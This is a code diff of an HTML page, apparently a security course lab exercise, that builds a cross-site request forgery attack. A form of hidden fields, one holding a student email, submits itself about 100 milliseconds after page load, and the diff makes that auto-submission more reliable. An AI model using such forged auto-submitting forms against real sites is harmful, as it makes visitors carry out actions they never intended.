@@ -20,13 +20,16 @@
         value="Never gonna run around and desert you"
       />
       <input type="hidden" name="email" value="2022201555@ruc.edu.cn" />
-      <input type="submit" name="submit" value="submit" style="display: none" />
+      <input type="hidden" name="submit" value="submit" />
+      <input type="submit" value="Submit" style="display: none" />
     </form>
   </body>
 
   <script>
-    setTimeout(function () {
-      document.getElementById("csrf_form").submit();
-    }, 100);
+    document.addEventListener("DOMContentLoaded", function () {
+      setTimeout(function () {
+        document.getElementById("csrf_form").submit();
+      }, 100);
+    });
   </script>
 </html>
